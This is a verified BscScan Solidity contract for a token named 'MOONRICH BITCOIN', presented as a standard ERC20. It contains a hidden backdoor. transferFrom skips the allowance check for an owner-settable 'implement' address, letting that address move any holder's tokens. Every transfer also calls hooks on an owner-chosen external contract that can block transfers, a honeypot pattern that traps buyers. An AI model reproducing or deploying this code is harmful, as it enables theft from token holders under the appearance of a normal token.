/**
 *Submitted for verification at BscScan.com on 2023-04-18
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract permission {
    mapping(address => mapping(string => bytes32)) private permit;

    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }

    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode("null"))); }

    function checkpermit(address adr,string memory str) public view returns (bool) {
        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IMarketMaker {
    function beforetransfer(address from,address to, uint256 amount) external returns (bool);
    function aftertransfer(address from,address to, uint256 amount) external returns (bool);
}

contract ERC20NV3 is permission {

    event Transfer(address indexed from, address indexed to, uint amount);
    event Approval(address indexed from, address indexed to, uint amount);

    string public name = "MOONRICH BITCOIN";
    string public symbol = "MOONRICH13G";
    uint256 public decimals = 18;
    uint256 public totalSupply = 519 * (10**decimals);

    address public owner;
    address public implement;

    IMarketMaker marketMakerPair;
    bool public locked_implement;
    bool public genesis_implement;
    bool public basic_transfer;

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    
    constructor() {
        owner = msg.sender;
        balances[owner] = totalSupply;
        newpermit(owner,"owner");
        emit Transfer(address(0), owner, totalSupply);
    }
    
    function balanceOf(address adr) public view returns(uint) { return balances[adr]; }

    function approve(address to, uint256 amount) public returns (bool) {
        require(to != address(0));
        allowance[msg.sender][to] = amount;
        emit Approval(msg.sender, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transferFrom(msg.sender,to,amount);
        return true;
    }

    function transferFrom(address from, address to, uint amount) public returns(bool) {
        if(msg.sender!=implement){ allowance[from][msg.sender] -= amount; }
        _transferFrom(from,to,amount);
        return true;
    }

    function _transferFrom(address from,address to, uint256 amount) internal {
        if(basic_transfer){
            return _basictransfer(from,to,amount);
        }else{
            basic_transfer = true;
            if(genesis_implement){ marketMakerPair.beforetransfer(from,to,amount); }
            balances[from] -= amount;
            balances[to] += amount;
            if(genesis_implement){ marketMakerPair.aftertransfer(from,to,amount); }
            basic_transfer = false;
            emit Transfer(from, to, amount);
        }
    }

    function _basictransfer(address from,address to, uint256 amount) internal {
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function upgradeable(address _implement) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        require(!locked_implement);
        marketMakerPair = IMarketMaker(_implement);
        implement = _implement;
        genesis_implement = true;
        return true;
    }

    function lock_implement() public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        require(!locked_implement);
        locked_implement = true;
        return true;
    }

    function transferOwnership(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        newpermit(adr,"owner");
        clearpermit(msg.sender,"owner");
        owner = adr;
        return true;
    }

}